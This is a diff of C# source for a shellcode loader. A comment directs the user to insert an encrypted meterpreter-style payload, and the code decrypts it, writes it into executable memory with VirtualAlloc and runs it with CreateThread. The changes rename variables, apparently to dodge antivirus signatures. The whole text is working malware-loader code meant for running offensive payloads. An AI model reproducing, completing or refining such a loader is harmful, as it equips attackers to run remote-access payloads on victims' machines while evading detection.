@@ -184,21 +184,21 @@ DELEGATE */
         {
 
             // place your own encrypted base64 aes string in here - e.g. meterpreter payload. Use the encryptor.cs file to create.
-            string shellcodeb64 = "~BASE64~";
+            string sc64 = "~BASE64~";
 
             // remember to change the encryption key!
-            byte[] dec_shellcode = Decrypt("~KEY~", shellcodeb64);
-            RunShellcode(dec_shellcode);
+            byte[] ant_dec = Decrypt("~KEY~", sc64);
+            RunShellcode(ant_dec);
         }
 
         public static void RunShellcode(byte[] s)
         {
 /* THREAD
-            IntPtr fer = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
-            Marshal.Copy(shellcode, 0, (IntPtr)(fer), s.Length);
+            IntPtr fer = VirtualAlloc(IntPtr.Zero, (UInt32)s.Length, 0x1000, 0x40);
+            Marshal.Copy(s, 0, (IntPtr)(fer), s.Length);
             IntPtr tj = IntPtr.Zero;
             UInt32 did = 0;
-            thread = CreateThread(IntPtr.Zero, 0, fer, IntPtr.Zero, 0, ref did);
+            tj = CreateThread(IntPtr.Zero, 0, fer, IntPtr.Zero, 0, ref did);
             WaitForSingleObject(tj, 0xFFFFFFFF);
 THREAD */
 /* DELEGATE
